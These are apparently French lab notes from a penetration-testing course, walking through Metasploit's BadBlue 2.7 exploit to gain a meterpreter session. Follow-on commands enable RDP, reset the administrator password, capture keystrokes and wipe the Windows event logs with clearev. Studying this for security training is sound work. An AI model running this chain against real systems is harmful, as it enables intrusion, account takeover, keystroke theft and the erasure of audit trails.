
## Badblue 2.7 / RDP
Si cette version est active sur le port 80,
`search badblue`  
`exploit/windows/http/badblue_passthru` : Rentrer la cible, puis `set target` et choisir "Badblue\ EE\ 2.7\ Universal"  
Une fois le meterpreter récupéré (on peut le conserver en x86), on le met en background, puis :  
`post/windows/manage/enable_rdp`, renseigner la session, puis "run"  
Lancer un scan avec nmap sur le port 3389 permet de voir que le service est actif.  
Reprendre la session en cours.  
`net users` pour lister les utilisateurs actuels sur le système. Il y a "administrator".  
On peut facilement changer le mot de passe maintenant (car nous avons des droits "SYSTEM") `net users administrator hack_123321`.  

On peut ensuite se connecter en RDP normalement avec les credentials :  

`xfreerdp /u:administrator /p:hack_123321 /v:192.168.1.1`  

 
## Badblue 2.7 / Keylogger  
`exploit/windows/http/badblue_passthru`.  
`sysinfo` et `getuid`, nous indique des droits administrator et un meterpreter en x86.  
``pgrep explorer` pour trouver le service et ensuite migrer dessus pour avoir un x64.    
`keyscan_start`, lance le sniffing de keylogging, puis démarrer notepad sur la cible et écrire, puis sur la machine d'attaque `keyscan_stop`, et `keyscan_dump` affiche les données écrites.  


## Effacer les logs
`exploit/windows/http/badblue_passthru`
`shell`, `net user administrator My_Password` permet de changer le mot de passe. Ceci sera visible dans event viewer.  
On retourne sur le meterpreter (pas le shell) et `clearev`permet de supprimer tous les logs.  